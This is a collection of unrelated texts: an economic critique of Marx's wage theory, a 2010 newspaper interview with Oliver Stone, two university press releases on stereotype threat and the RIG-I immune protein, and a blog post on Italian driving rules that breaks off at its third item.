When the articles and dissertations published in England in the early 1860s convinced Marx that it was no longer permissible to cling unswervingly to the wage theory of the classical economists , he modified his theory of the value of labor power .
He declared that " the extent of the so - called natural wants and the manner in which they are satisfied , are in themselves a product of historical evolution " and " depend to a large extent on the degree of civilization attained by any given country and , among other factors , especially on the conditions and customs and pretensions concerning the standard of life under which the class of free laborers has been formed . "
Thus " a historical and moral element enter into the determination of the value of labor power . "
But when Marx adds that nonetheless " for a given country at any given time , the average quantity of indispensable necessaries of life is a given fact , " he contradicts himself and misleads the reader .
What he has in mind is no longer the " indispensable necessaries , " but the things considered indispensable from a traditional point of view , the means necessary for the preservation of a standard of living adequate to the workers ' station in the traditional social hierarchy .
The recourse to such an explanation means virtually the renunciation of any economic or catallactic elucidation of the determination of wage rates .
Wage rates are explained as a datum of history .
They are no longer seen as a market phenomenon , but as a factor originating outside of the interplay of the forces operating on the market .
However , even those who believe that the height of wage rates as they are actually paid and received in reality are forced upon the market from without as a datum cannot avoid developing a theory that explains the determination of wage rates as the outcome of the valuations and decisions of the consumers .
Without such a catallactic theory of wages , no economic analysis of the market can be complete and logically satisfactory .
It is simply nonsensical to restrict the catallactic disquisitions to the problems of the determination of commodity prices and interest rates and to accept wage rates as a historical datum .
An economic theory worthy of the name must be in a position to assert with regard to wage rates more than that they are determined by a " historical and moral element . "
The characteristic mark of economics is that it explains the exchange ratios manifested in market transactions as market phenomena the determination of which is subject to a regularity in the concatenation and sequence of events .
It is precisely this that distinguishes economic conception from the historical understanding , theory from history .
We can well imagine a historical situation in which the height of wage rates is forced upon the market by the interference of external compulsion and coercion .
Such institutional fixing of wage rates is one of the most important features of our age of interventionist policies .
But with regard to such a state of affairs it is the task of economics to investigate what effects are brought about by the disparity between the two wage rates , the potential rate that the unhampered market would have produced by the interplay of the supply of and the demand for labor on the one hand , and on the other the rate that external compulsion and coercion impose upon the parties to the market transactions .
It is true , wage earners are imbued with the idea that wages must be at least high enough to enable them to maintain a standard of living adequate to their station in the hierarchical gradation of society .
Every single worker has his particular opinion about the claims he is entitled to raise on account of " status , " " rank , " " tradition , " and " custom " in the same way as he has his particular opinion about his own efficiency and his own achievements .
But such pretensions and self - complacent assumptions are without any relevance for the determination of wage rates .
They limit neither the upward nor the downward movement of wage rates .
The wage earner must sometimes satisfy himself with much less than what , according to his opinion , is adequate to his rank and efficiency .
If he is offered more than he expected , he pockets the surplus without a qualm .
The age of laissez - faire for which the iron law and Marx 's doctrine of the historically determined formation of wage rates claim validity witnessed a progressive , although sometimes temporarily interrupted , tendency for real wage rates to rise .
The wage earners ' standard of living rose to a height unprecedented in history and never thought of in earlier periods .
The labor unions pretend that nominal wage rates at least must always be raised in accordance with the changes occurring in the monetary unit 's purchasing power in such a way as to secure to the wage earner the unabated enjoyment of the previous standard of living .
They raise these claims also with regard to wartime conditions and the measures adopted for the financing of war expenditure .
In their opinion even in wartime neither inflation nor the withholding of income taxes must affect the worker 's take - home real wage rates .
This doctrine tacitly implies the thesis of the Communist Manifesto that " the working men have no country " and have " nothing to lose but their chains " ; consequently they are neutral in the wars waged by the bourgeois exploiters and do not care whether their nation conquers or is conquered .
It is not the task of economics to scrutinize these statements .
It only has to establish the fact that it does not matter what kind of justification is advanced in favor of the enforcement of wage rates higher than those the unhampered labor market would have determined .
If as a result of such claims real wage rates are really raised above the height consonant with the marginal productivity of the various types of labor concerned , the unavoidable consequences must appear without any regard to the underlying philosophy .
The same is valid with regard to the confused doctrine that wage earners are entitled to claim for themselves all the benefits derived from improvements in what union officers call the productivity of labor .
On the unhampered labor market wage rates always tend toward the point at which they coincide with the marginal productivity of labor .
The concept of the productivity of labor in general is no less empty than all other universal concepts of this kind , e.g. , the concept of the value of iron or gold in general .
To speak of the productivity of labor in a sense other than that of the marginal productivity is meaningless .
What these union officers have in mind is an ethical justification of their policies .
However , the economic consequences of these policies are not affected by the pretexts advanced in their favor .
Wage rates are ultimately determined by the value the wage earner 's fellow citizens attach to his services and achievements .
Labor is appraised like a commodity not because the entrepreneurs and capitalists are hardhearted and callous but because they are unconditionally subject to the supremacy of the pitiless consumers .
The consumers are not prepared to satisfy anybody 's pretensions , presumptions , and self - conceit .
They want to be served in the cheapest way .

It would seem that none of the mail found by Miss Cowan was written by passengers on the plane , who were seamen bound for a new ship in Sunderland .
The bag was destined for the US and the Dundee team has already succeeded in finding the owners of some correspondence .
There 's no let - up for Hollywod 's most controversial director – the sequel to Wall Street , a documentary about Hugo Chávez and his most ambitious and personal project to date , the secret history of America
The following correction was printed in the Observer 's For the record column , Sunday 25 July 2010
The United States awards the Purple Heart to those wounded in combat ; it is not a bravery medal .
Oliver Stone is a man 's man .
Of this I have no doubt before meeting him .
Not just because of his status as a sort of latter - day Ernest Hemingway , an action man with a reputation for women and drugs who won the Purple Heart for bravery in Vietnam , and then an Oscar for reproducing his experiences on celluloid .
But because the most compelling sequences from his latest film , a documentary called South of the Border , show him hanging out with Venezuela 's president , Hugo Chávez , chewing the cud about politics and war , talking very much mano a mano .
It 's an impression that 's reinforced moments before I meet him in his Los Angeles office when the photographer appears and shows me some of the portraits he 's taken .
They 're slightly startling because Stone has a new moustache , a big , bristling , Zapata number , and in the tiny digital frame on the back of the camera , he looks like it's him who really ought to be dressed in military fatigues and running his own small South American regime .
Then he ambles in , distractedly .
" Suzie ! " he calls to his co-producer .
" Where are my glasses ?
I think I 've lost my glasses . "
We both look at him .
He has one pair of glasses on the top of his head .
And another pair on a piece of cord around his neck .
" They 're on your head , " says Suzie .
" Do you think you could go and look for them ?
They 're very valuable to me . "
Suzie hesitates and then , having seemingly witnessed this sort of situation before , says : " OK ! " and disappears out the room .
Two minutes later , Stone puts his hand to his head .
" Suzie !
I 've found them !
They were on my head ! "
Suzie reappears at the door .
" I know , " she says .
" I told you . "
" Did you ?
Jesus !
What , now I can't even hear ? "
It 's a rather nice surprise , this .
The bumbling , the self - accusation , the absentmindedness .
On paper , he 's so much the alpha male that , as one interviewer put it : " One expects to find antler stubs under his thatch of suspiciously too - black hair . "
As well as his war record , there are his various arrests for possession of drugs , as well as his well - rehearsed views on monogamy ( " unnatural " ) .
But , mostly , there 's the work .
There seems an almost hyper - masculinity to Stone 's oeuvre .
He 's the director of Platoon , one of the most highly rated Vietnam films of all time , a film that was based on his experience .
The war spawned a further two films , Born on the Fourth of July and Heaven & Earth .
He made one of the most violent and controversial films of the 90s , Natural Born Killers .
And he's had a fascination with some of the most powerful men on earth , having made films about no fewer than three American presidents : the Oscar - winning JFK , Nixon and , most recently , W , about George W Bush .
In the flesh , however , he 's more like an amiable professor .
There 's a sort of otherworldly air of distraction and he reminds me of one of those old - fashioned Marxist academics who have now all but disappeared .
Although he's not a Marxist , he has a strictly Stoneist view of the world and to this end he has facts , figures , theses , arguments , names , dates , an entire view not just of contemporary politics but also history .
But one of the most appealing aspects of Stone is the sheer depth and breadth of his interests and ambition .
In addition to tackling socialism ( and how Chávez has fanned its flames across South America ) in South of the Border , he has also , this year , taken on capitalism in Wall Street : Money Never Sleeps , the much - awaited return this September of Gordon Gekko to a Wall Street where greed is n't just good , it 's legal .
Two films , two ideological systems , and yet this pales in the face of his next project : a 10 - part documentary series for HBO , Oliver Stone 's Secret History of America .
He 's right in the throes of it .
" It 's my big project .
It 's something I want to leave behind .
And we 're now in the third fucking year of it , " he says .
" It 's a war .
They 're in that room next door working on it right now .
It 's an ongoing odyssey . "
It 's a truly massive project , a personal mission , the encapsulation seemingly of all that Oliver Stone has thought and read and felt in the 63 years of his life so far , and by the end of the interview I feel slightly anxious about it on his behalf .
After all , Stone 's passion projects have n't always ended well .
Platoon did .
It was the film that he had to make , a heavily autobiographical account of his Vietnam war , " a grunt 's - eye view " , and won him his second Oscar ( his first was for writing the screenplay of Midnight Express ) .
But Alexander , his magnum opus , a biopic of Alexander the Great that he at one point calls " his life 's work " , was savaged by the critics .
The reception of South of the Border in the States is , I imagine , a small taste of what is to come .
If Platoon was a grunt 's - eye view of war , South of the Border is a leftie 's - eye view of South America and he 's spent the last few weeks fighting off criticism : that he 's a patsy ; a Chávista ; that he did n't speak to any of the opposition figures .
" But that was n't what we set out to do ! " says Stone .
" I let him talk .
That way you see him as he sees himself .
It 's a psychiatrist 's technique . "
It 's interesting that he brings this up .
He 's been in analysis three times , he tells me later .
But the biggest surprise about Oliver Stone , and perhaps his greatest contradiction , is that for somebody who is such a doer , who has such a relentless drive to work , who has done and accomplished so much , who started his career writing scripts for Scarface and Midnight Express and has gone on to direct nearly 20 feature films and several documentaries – is that he's also an introvert and a self - critical one at that .
He can quote , verbatim , unfavourable reviews he 's received years after the event .
More than this , there 's an introspective aspect to his nature that is quite at odds with the macho persona .
And , for all the argument and theorising , it becomes apparent that Stone is a creature of his emotions .
He makes the films he does because he feels he has to .
Many of his career decisions seem to be motivated not by good sense , money or the esteem of his peers – he 's driven by something far more internal than that .
In an old interview , Stone once said that his films are an " emotional barometer " for him .
The violence of Natural Born Killers came out of the anger and sadness he felt when his second wife and mother of his two sons , Elizabeth , left him .
So , I wonder , what attracted him to the competing issues at stake in South of the Border and Wall Street : Money Never Sleeps ?
" My father was a Republican .
And he hated Roosevelt .
And that 's sort of been the battle of my life , I think .
You have to understand that I grew up a Republican conservative .
I hated Castro .
And I put my money where my mouth was because I went to war , but I understood pretty quickly that this was another place , another culture , and we would never fit in there .
" It 's the same story in Afghanistan , Iraq and South America .
It 's white people meeting people who they think they are better than .
And I feel that this war is the war of my life .
I 've seen it over and over again and if I can do one thing with what 's left of my remaining years , it 's just to cry it out and say it , I hope , with enough entertainment that people will want see it . "
In this context , South of the Border is simply another variant on this , his life 's work .
What the film makes clear is how much of a bogeyman Chávez is in the United States .
The first half of the film , a not - altogether - successful Michael Moore - esque homily , features clips from the US news media ( or " the missile shield " , as Stone refers to it ) with Fox News declaring that Chávez is " as big a threat as Osama bin Laden " .
It 's in the second half that the film comes to life , though , where Stone meets Chávez .
" I liked him .
He 's very warm and very gracious .
And he 's a bear .
I 've always said that if he looked like Woody Allen he 'd play a lot better with the world press .
I think men are threatened by his physicality . "
The affection seems to be mutual .
At one point , standing on a runway in the dark , Chávez points to a building where he was imprisoned during a coup and where some of his men lost their lives .
" As an ex-soldier I understand , " says Stone and Chávez rests his hand upon his shoulder .
Making a documentary " was the last thing I wanted to do , " says Stone .
" It was Fernando Sulichin who I worked with on Comandante [ the 2003 documentary of Stone interviewing Fidel Castro ] and who is funding Secret History who suckered me in .
And we went and we talked to Chávez and he said , ' Do n't just take my word for it ; go and talk to these other presidents . '
So that 's what we did , we went on this road trip . "
He jaunts off and chews coca and talks socialism with Bolivia 's Evo Morales and meets Brazil 's Lula da Silva , Paraguay 's Fernando Lugo , Ecuador 's Rafael Correa and Cuba 's Raúl Castro .
" The result , " says Stone , " is this weird little thing .
What is it ?
It 's not a documentary . "
It is , just not an entirely sane one , with two halves that do n't quite fit together , but it 's still a fascinating glimpse of Chávez and an overview of a massive popular movement on one of the largest continents of the world .
" I 'm not an interviewer , I 'm a director .
And I go to these places and take advantage of the status that I have as a film - maker and can treat the person like an equal .
And I 'm not hostile .
I give them face time .
We do n't even know the names of these guys in the United States . "
Fundamentally , Oliver Stone is doing it his way because he can and because he 's spent his life doing things his way .
He 's as idiosyncratic as they come , jumping from genre to genre , from indie documentaries to studio blockbusters .
Hitting spectacularly with some ( he 's won three Oscars ) , missing spectacularly with others ( Nixon , like Alexander , was brutally panned ) .
He 's always been impossible to pigeonhole , to predict quite where he 'll go next .
There are high hopes for Wall Street : Money Never Sleeps .
I rewatch Wall Street on the plane over and enjoy it as much as I did when I first saw it years ago .
It 's completely of its time – mobile phones the size of breeze blocks , an array of kitchen equipment so dazzling it gets its own special sequence ( I give you the microwave and the hand - held blender ) .
But it has stood the test of time .
Released in 1987 , it was a brilliant , prescient taste of what was to come : the crash later that year ; the insider trading scandals .
I also spot Stone in a cameo I had n't noticed before .
He 's plays a moneyman , a financier .
" I was playing my father , Lou , " he says .
And , had the 60s and Vietnam not blown him off course , it 's what Stone might very well have become .
It was what he was born to .
His father was a stockbroker , who met Oliver 's French mother in Paris during the second world war .
Stone had a privileged , if emotionally austere , upbringing at an east coast boarding school .
His mother was often absent and then disappeared altogether : aged 15 , his headmaster called him into his office and informed him that his parents were getting divorced .
He went to Yale – he was in the same year as George Bush – and it's here that his conventional , bourgeois upbringing breaks down .
He dropped out , deciding first to try to write a novel and then to enlist .
I read a quote , I say , where he says that he felt he would n't be properly human if he did n't know what war was .
" There was something bugging me , " he says .
" Yale was a problem for me .
I was not a happy young man .
I did n't feel good in my skin .
I 'm glad I left but it was very painful at the time .
My father thought I was pissing away my life .
I was becoming an infantry soldier and I was going to become one of life 's unfortunates .
I was n't going to amount to much .
He was worried .
And frankly so was I . "
You 've spent the rest of your life proving him wrong ?
" In a way , although it took me years .
Coming back from Vietnam was extremely difficult .
My father did , towards the end of his life , believe that Vietnam was a mistake , but we had many , many fights about it . "
What would your father have made of the Wall Street of the last few years ?
I ask .
" Look , he was pissed off when we left the gold standard in ' 73 , although '73 is actually very interesting .
It 's a really crucial year , because the income of the average working man flattened out in ' 73 and never went up in spending ability .
But meanwhile the productivity of America went up like this .
Where did that money go ?
It went to CEOs and stock holders .
It went to the banks . "
The most remarkable aspect of Wall Street was that the villain of the piece , Gordon Gekko , became a hero to a new generation of moneymen .
Michael Douglas claims that he 's unable to go out for dinner in New York without having a hedge fund manager slap him on the back and thank him for inspiring him to enter Wall Street .
But if the first film was an old - fashioned , rite - of - passage story about a young man , Bud Fox , corrupted by greed , is there a take - home message from Wall Street 2 ?
" It 's a fun movie , an entertaining movie .
The first one I think you 'd say is a morality tale and I think this one is too .
In the sense of what is important ?
Are there more important values than money ? "
Were you wary of glamourising it , given what happened to Gekko ?
" It 's 23 years on and greed will go on for the rest of times .
And envy .
Envy plays a big role in this film too .
If you pass all the regulations in the world , they 'll try and get around that .
I have no problem with people wanting to make money .
But do n't make the banks into hedge funds , which is what they did .
" There 's something Douglas says in the movie .
He says that in 2008 , of the corporate profits in the US , 47 % were from finance - related companies .
In the old America , it was 17 % .
It became the main business of America .
We became a giant casino . "
There is a father and son at the heart of the first Wall Street , as there is in much of Stone 's work .
It 's a relationship that has clearly preoccupied him .
But Lou Stone was perhaps not your standard , uptight New York stockbroker : he paid for Stone to lose his virginity to a prostitute at the age of 16 .
Stone has raised two sons himself now – Sean , 26 , and Michael , 18 .
Has that made him see his father differently ?
" Sure , but even before I had my sons , I was very father - oriented .
He was a very powerful man .
But you must remember my mother was very powerful too . "
Ah yes , his mother .
Jacqueline Goddet met Lou Stone when he was working as an aide to Eisenhower .
She does sound like an extraordinary character , I say .
" She still is – she 's 88 and a party animal .
She loves people and they love her .
She called me the other night and she 'd been out on the 4th of July weekend until two in the morning . "
Perhaps Stone 's greatest exploration of his relationship with his mother is in his novel , A Child 's Night Dream .
He started writing it when he was 17 and returned to it at 50 , a period that he refers to as his midlife crisis .
" I 'd been criticised and loved , and criticised and loved , I mean , really , extremely …
Nixon had just come out and had flopped .
And I loved Nixon .
I thought it was one of my more mature works and it had not been well - received .
But it did n't matter .
I returned to the book .
I knew that it would never have a big circulation , but it mattered to me and I got it out .
I just stopped making films for two years and basically did that .
I think I lost my way and I felt like the book was putting me back . "
Was writing the novel a way of reckoning with the past and in particular his mother ?
After all , there is a character called Oliver Stone who is sexually obsessed with his mother …
" Yeah , well , there were two Stones , William and Oliver ; they were two sides to me .
But , yes that 's correct .
There was no incest , but my mother was very French and very free .
It was n't a big deal to walk around naked in the house and stuff like that . "
I tell him about an extraordinary quote I have found from her a few years ago , where his mother says " " Oliver did n't just love me .
He was in love with me . "
" Is that right ? " he says .
" Ha , ha , ha .
Well , she was a great tease .
If that 's the case , it 's a classic Freudian case , the frustrations of an Oedipus complex .
The son wants the mother but never gets her because she 's the first woman in his life . "
" Does that make sense to you ? " I ask .
" The Freudian explanation ? "
" Absolutely .
Your mother 's body is the first thing you know and , frankly , it 's very attractive and it turns you on .
But you do n't know what to do so it 's a tremendous puzzle . "
Usually , when an interviewer discovers something interesting about a subject , it 's repeated in every article thereafter , but I find only one piece from the mid-90s , an interview with Elizabeth Stone , in which she claims that it was his mother who initiated him sexually .
She says that Jacqueline had told her : " He could n't relax and I had to show him . "
" It 's not clear , " the interviewer goes on , " from detailed interviews with Elizabeth , Oliver and his mother , Jacqueline , what actually occurred .
Elizabeth claims that Jacqueline Stone touched her teenage son's genitals and masturbated him .
Jacqueline heatedly denies it . "
So , I ask him straight out : " Did your mother teach you how to masturbate ? "
" Well , I ca n't live with denial – sure . "
" She physically showed you ? "
" It was no big deal .
It 's not English .
It 's French .
It was no big deal .
I was n't attracted to her .
You have to understand .
After a certain point , I grew up and I moved on .
And I 've had successful relations – with everybody ! "
He says this a joke , but it 's also true .
He is a self - confessed womaniser .
Elizabeth , his second wife , ( his first , Najwa Sarkis , was Lebanese ) is said to have left him after having finally run out of patience with his extramarital dalliances .
" It 's on the record , " says Stone .
" And I do n't like to lie .
That 's bullshit .
It 's not a big deal … I 'm not running for office . "
The Asian mentality is very different , he says , to the Anglo - Saxon one .
" That 's why I loved Asia when I was young .
When I went over there , it was a revelation .
I could never quite come back .
I always had difficulties readjusting to the Anglo - Saxon mentality with women . "
It is why his third wife , Sun-jung Jung , understands him , he says .
" She 's cool .
She 's Korean .
Different mentality .
Mutual respect … she laughs and trills and she sings when she speaks .
I love the sound of her voice . "
Their daughter , Tara , is 14 .
" She 's part of that new generation , Asian - American .
We 're really going through it now .
I mean , she 's 14 – she does respect me but she does give me a hard time .
But it 's fun .
She 's smart .
We go to the movies .
She loves talking about movies . "
Has having a daughter changed his attitude to women ?
" Yes it has .
It 's harder to be blind .
Sometimes , you have to be blind to jump into some of these things , but when you see your daughter in some of these women … you see the human side more clearly than before . "
I wonder aloud whether his relationship with his daughter will inform his female characters .
His films have always seemed to me to be explorations of masculinity , of male relationships , in one form or another , but then his world , for years , was male .
He was an only child and incarcerated for years in an all - male boarding school , before going to an all - male Yale .
Discovering women in Vietnam , he says , he felt like Gauguin in the South Seas .
" They were these ripe fruits . "
He starts reciting his female characters , finishing with Olympias , Alexander 's mother .
It is abundantly clear from everything he says that Alexander was the project of his life .
" It was .
That 's why I went back three years later and did a third version of it .
If you could ever see it – it's the right version of it .
The editing was rushed …
I was never able to … frankly it's a complicated vision and I 'm fighting to get it recirculated .
In England , there is a release of it , but it 's very little known because it was so slagged at the time .
It was very painful to me . "
Of all the films , it 's his most autobiographical , he says .
That 's a strange statement given that its subject concerns the greatest emperor who ever lived , but then he is also the vulnerable son of all - powerful parents .
He first dreamt of making it as a film student , he says , and it was during that midlife period of reflection that he came back to it again .
" I remember feeling like I had lost my way .
The book was important and so was Alexander .
I do think that there is the idea what you are when you 're young , you must stay faithful to something in there . "
This is one of his core beliefs .
His teenage years are still the crucible of Oliver Stoneness on which he draws .
They were so extreme , in almost every way .
From the emotional barrenness of boarding school ( " For years , I thought it was a disaster ; it had taken the love out of my life ; there was no sense of humanity " ) , those odd experience with his parents and sexuality , through the privilege of Yale and finally , apocalyptically , Vietnam .
You really do n't need to be a Freudian to read something into this .
His ex-wife , Elizabeth , has put it more bluntly : " That little boy did n't stand any chance of any normal sort of life . "
He 's an assiduous diary - keeper and regularly rereads ancient entries to check up on himself .
In 2000 , he even decided to relive the acid trips of his youth .
Under the supervision of three psychoanalysts , he sat on a mat , put an eyemask on and took LSD .
It lasted nine hours and was , he says , because he wanted to relive past experiences with the drug " under more scientific conditions " .
He 's gone through various stages of taking drugs , mostly psychedelic ones .
" Heavy trips , " he calls them – in Oliver Stone there 's a small part of the 60s that never died .
He tells me about being " frightened to death " on one of them .
So why did he do it ?
" Because of the adventure . "
Ah yes .
The adventure .
That other Oliver Stone hallmark .
His cousin James says that Stone went to war because : " Anything he could do to be at the edge , and to experience more than other people had experienced , and to shock , he was likely to do .
It was consistent for him to want to experience the most intense thing that was going on then in the world . "
Even now , there seems to be no letting up .
The hell - raising days may be over – although I would n't bank on it – but there still seems to be this lust for experience , as evidenced by South of the Border .
At an age where most men might start thinking about golf , Stone is chasing socialists across South America .
He 's as committed as he ever has been , if not more so .
Politically , workaholically .
There 's still a relentless drive to work , work , work .
It 's coming up to 9 pm by the time I leave his office and nobody seems to be making a move to go home .
His film editor has been waiting patiently for him in the room next door , ready to attack yet another section of Oliver Stone 's Secret History of America .
There 's another documentary on Castro to come – the third part of his trilogy .
He 'd like to do an update to his novel , he says , some sort of epilogue .
There are the final edits on Wall Street : Money Never Sleeps .
And then there 's South of the Border to launch in London .
And defend from attacks all over again .
I fear for Oliver Stone 's Secret History of America .
Oliver Stone will do it Oliver Stone 's way , whatever the critics think .
He exhibits an artist 's singlemindedness , an ideologue 's obduracy .
If his ambition occasionally exceeds his talent , it 's not because his talent is small , but that his ambition is so very , very large .
The Alexander comparison is really not as far - fetched as it might seem : he really is trying to remould the world according to his vision .
Watch out , world .

BLOOMINGTON , Ind. --
Negative stereotypes not only jeopardize how members of stigmatized groups might perform on tests and in other skill - based acts , such as driving and golf putting , but they also can inhibit actual learning , according to a new study by Indiana University researchers .
While the effect of negative performance stereotypes on test - taking and in other domains is well documented , the study by social psychologist Robert J. Rydell and his colleagues in IU 's Department of Psychological and Brain Sciences is the first to show that the effects might also be seen further upstream than once thought , when the skills are learned , not just performed .
" The effect on learning could be cumulative , " says Rydell , whose research focuses on stereotype threat involving women and mathematics .
" If women do not learn relatively simple skills early on , this could spell trouble for them later on when they need to combine a number of more simple skills in new , complicated ways to solve difficult problems .
For example , if a young girl does not learn a relatively simple principle of algebra or how to divide fractions because she is experiencing threat , this may hurt her when she has to use those skills to complete problems on geometry , trigonometry , or calculus tests . "
This reduced learning may ultimately hamper efforts to help women enter into careers in science and mathematics , where they are currently underrepresented .
The study , " Stereotype threat prevents perceptual learning , " was published on Monday ( July 26 ) , in the Proceedings of the National Academy of Sciences Early Edition .
Co-authors are Richard M. Shiffrin , Kathryn L. Boucher , Katie Van Loo and Michael T. Rydell , all from IU .
The study was designed to examine " attention and perceptual learning in a visual search , " not mathematical learning specifically , because the tasks used in the experiments allowed researchers to easily differentiate between learning effects and performance effects .
Through a series of experiments involving Chinese characters and color judgment tasks , the researchers were able to show that actual learning had not occurred in the group of women who had been reminded of the negative stereotypes involving women 's math and visual processing ability .
Instead of finding it difficult to express learning , which is a typical effect of stereotype threat , they had not learned the same skill that women in the control group , who had not been exposed to the negative stereotypes , had learned .
The women in the stereotype threat group appeared to try too hard to overcome the negative stereotype , ultimately searching for the characters in the experiment in a focused yet unproductive manner rather than letting the figures just " pop out , " as they normally would have after some training .
" The results seem to fit with the view that the women under threat try harder to carry out the task , thereby persisting in effortful serial search throughout training , and failing to find and learn an alternative strategy that makes search easier and less effortful , " the authors wrote .
" Women who are good at the skill they are performing are more likely to show stereotype threat because they have more invested in disproving the stereotype and are more distracted by the stereotype , " Rydell said .
Rydell said he and his colleagues have conducted additional research specifically on mathematical learning and the results are forthcoming .
They think the effect of stereotype threat on learning warrants more study by scientists and more attention by educators .
" ( The present study ) points to the importance of creating environments that reduce the impact of stereotype threat during mathematical skill acquisition by women , " the authors concluded in their PNAS article .
" If creating such an environment is not done , the learning deficits that result could well be cumulative , causing problems that continually worsen as development proceeds . "

The study was supported by the National Science Foundation .
The Department of Psychological and Brain Sciences is within IU 's College of Arts and Sciences .
A team of biochemists has identified the molecular mechanism by which an immune response is triggered by the invading viruses , according to recent research .
The results could eventually lead to new therapies for many different kinds of viral infections , from the common cold to hepatitis and AIDS , according to Dr. Pingwei Li , Texas A&M University 's department of biochemistry and biophysics .
" This work provided insight into how our immune system recognizes viral RNA at the atomic level , " Li said .
The results of the team 's research were published on July 15 by Structure of Cell Press , said Li , who is one of a 10 - member team , four of who are with Li's department .
In the last few years , Li's group studied an enzyme called " RIG - I " that senses the presence of foreign RNA and triggers an innate immune response .
Unlike an adaptive immune response , innate immune response gives immediate protection against infection .
Adaptive immune responses are learned by the body -- or " taught " as with inoculation , Li said .
But innate immunity is built right into the cell 's genetic structure and is ready to respond whenever a pathogen invades the host .
The innate immune system can rapidly respond to an entirely novel virus or bacteriological threat , while the adaptive immune system has to go through a kind of learning process that may take weeks to be effective sometimes .
Just as important , the adaptive immune system is coupled to innate immunity , Li said .
Because of this connection to immune response , learning exactly how RIG - I senses foreign viruses promises great rewards in treating a host of diseases , he said .
" It is a very exciting and hot topic among researchers these days , " Li said .
" A couple of labs were racing to figure out how RIG - I works , but our team was the first to show how RIG - I recognizes the terminal triophosphate of viral RNA .
We determined the structure almost a year ago and the result was presented at the Keystone Symposium for Structural Biology early this year . "
Viruses contain RNA , which are molecules similar to DNA in many ways but which play different roles .
The RNA molecules from virus often have structures that do not exist in human RNA .
RIG - I specifically targets these unique structures and launches an immune response by triggering the secretion of interferon , Li said
Interferons are proteins produced and released by the infected cells to fight pathogens such as viruses or bacteria .
But exactly what was the mechanism by which RIG - I triggers the antiviral immune responses ?
Though there were some clues offered by previous research , it was not clear how it worked at the molecular level , Li said .
Researchers knew , for example , that the RIG - I enzyme specifically targets the structural unit called " 5 ' triphosphate , " which is unique to viral RNA .
Furthermore , it was known what a particular part of the RIG - I binds to the viral RNA .
" This crucial part is its ' C - terminal domain , ' a small RNA binding module capable of recognizing RNA from many different kinds of viruses , " he said .
To examine the molecular mechanism of viral RNA sensing by RIG - I , the team used human RIG - I C- terminal domain , and examined the binding action through several different techniques .
First , they used gel - filtration chromatography to figure out what kind of RNA binds to RIG - I .
Then , using surface plasmon resonance , a biosensor - based technonolgy , they examined how tightly RIG - I binds viral RNA and how fast it " gets on and gets off the enzyme , " Li said .
Surface plasmon resonance uses a laser beam to detect molecular bindings , he said .
Next , the team used a sophisticated analytical tool called " X - ray crystallography " to determine the three - dimensional structure of RIG - I bound to viral RNA .
Much like CAT scan used in hospitals , X - ray crystallography uses an X - ray beam diffracted through a crystal to image the atomic structure of molecules .
" Using a series of X - ray diffraction patterns , a crystallographer produces a 3D image of a molecule , " Li said .
" The image shows how a protein looks and how it recognizes the other molecules such as proteins or RNA . "
Li noted the structure and mechanisms described in the article concerned only a fragment of the RIG - I protein that is responsible for binding to viral RNA .
The team is currently working to analyze the full - length protein to gain further insight into how RNA binding activates signaling by RIG - I .
Li received a $ 1.5 million grant from the National Institutes of Health early this year to continue the research on RIG - I , he said .
" The ultimate goal of this research is to understand how our immune system fights viral infections .
Findings from this research will facilitate the development of novel antiviral and anticancer reagents and more effective vaccines . "

Car Commandments
As we discussed previously ( “ Us and Them ” ) , there are many factions in Politics and the Press who ’d prefer to dwell on the ‘ differences ’ between people , and try to inflate , leverage , and exploit any of the contentious issues that arise in order to further their own immediate agendas .
In an effort to try and close the various rifts that can form between Motorists and Cyclists , perhaps we could all take a wider perspective , and look for the common values that will benefit all Commuters and Travelers alike , regardless of their chosen mode of transport .
In terms of how we use our roadways , we could all stand to learn and apply better protocols , and learn to appreciate traffic flow from a more socially functional point of view .
In an effort to develop values that can be applied evenly across the road , and thus help smooth out traffic flow patterns and problems for everyone , let ’s look at some cultures that have embraced both Cycling and Automobiles .
Not surprisingly , we can look to European culture for examples of this duality , and although the French , British , and of course the Germans have all been instrumental in the development of both 4 and two - wheeled transport , it ’s clear that Italian automotive history and bicycle technology have played an undeniable role in forming a worldwide Culture that has advanced both of these pursuits to an Artform , with their panache , passion , and an undeniable sense of style …
The earliest pioneers of combustion powered vehicles were scattered among the French and British , and all spurred ahead by the renowned German breakthroughs and benchmarks established by Daimler and Benz .
Yet , throughout history , it ’s in the Italians with their profoundly passionate and historic connection to Racing sports , design and elite automobile and bicycles engineering and construction , where we see enthusiasm for all things on wheels so deeply etched into the collective and persistently socialist psyche of a people .
These social values offer us all some key reminders of what ’s required to manage the chaos of the road for everyone ’s greater benefit , and yes …Even our shared pleasure !
With that in mind , let ’s consider this annotated version of the 10 Commandments
Of Italian Car Ownership by skimming them for any principals that might resonate with you personally .
Since this is an initial overview of a rather large subject , feel free to add your own annotations in the Comments , as we all look for added value that can apply Drivers of the most exotic automobile , right down to the most humble Pedestrian , and all the forms of Cycling interspersed in between .
Values that can be expanded upon as we all learn to safely and effectively share our collective roadways by updating our often ‘ selfish ’ North American views on both Car Culture and Urban Cycling .
So without further ado , here are :
The 10 Commandments of Italian Automotive Operation
1 . Thou shalt respect lane discipline !
With the glaring exception of Southern Ontario , and parts of California , most North - American drivers seem to at least understand the regulating principle of lane discipline .
Theoretically , the slowest traffic should be in the right - hand lane , with traffic moving faster as you progress to the left .
The leftmost lane , however , should be for passing only and otherwise left clear .
It still amazes good drivers to see traffic queued up in the leftmost lane , that was once reserved for passing only .
Usually the result of people entering the freeway and then veering across three lanes of traffic only to plop their inattentive , cell phone - holding butts in the fast lane .
This mindset also manifests itself in bike lqanes and paths as well , where it ’s exacerbated by lane - hogging rollerbladers , adn even babystrollers !
The first thing NorthAmerican drivers need to do collectively is wake up .
We ’re so used to the traffic - induced coma that sucks every amount of joy from driving that it can render us dangerous in situations that require more involvement .
Though many North Americans ’ will stereotype Italian drivers as aggressive maniacs , they miss the point that most are also extremely attentive and sentient , or aware at all times , and that moving swiftly through this supposed chaos actually yields much better efficiencies …
If driving skills have been honed to do so .
2 . Thou shalt pass in the minimum distance necessary .
In order to pass on a two - lane road , the overtaking car gains speed in the aero - draft of the passable car while checking mirrors for faster traffic , then pulls out halfway into the other lane while shoulder checking blindspot , overtakes , and immediately returns to the proper side .
This style of passing is immensely more efficient and safer in that it allows cars with small speed differentials to overtake each other , while leaving the passing lane free for faster traffic .
Cars , Cyclists , and even Pedestrians should never be cruising side by side on a busy road / path , where they effectively bottle up ALL traffic , and create disorder behind them , and force riskier passes around them .
3 . Due to thine own incompetence or that of thy vehicle , thou shalt not hold up other drivers .
